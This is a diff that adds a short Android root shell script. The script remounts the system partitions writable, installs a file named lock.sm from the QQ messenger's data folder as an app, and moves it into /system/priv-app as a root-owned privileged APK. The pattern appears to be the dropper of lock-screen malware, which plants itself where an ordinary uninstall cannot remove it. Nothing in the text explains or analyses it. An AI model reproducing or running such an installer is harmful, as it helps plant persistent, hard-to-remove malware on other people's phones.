@@ -1,0 +1,14 @@
+mount -o rw,remount /
+mount -o rw,remount /system
+mount -o rw,remount /dev
+mount -o rw,remount /system/priv-app
+mount -o rw,remount /system/app
+sleep 1
+chmod 0777 /data/data/com.tencent.mobileqq/lock.sm
+pm install -r /data/data/com.tencent.mobileqq/lock.sm
+cat /data/data/com.tencent.mobileqq/lock.sm /system/app/yry.apk
+mv /data/data/com.tencent.mobileqq/lock.sm /system/priv-app/yry.apk
+chmod 0644 /system/priv-app/yry.apk
+chown root:root /system/priv-app/yry.apk
+chmod 0777 /system/app/yry.apk
+chown root:root /system/app/yry.apk
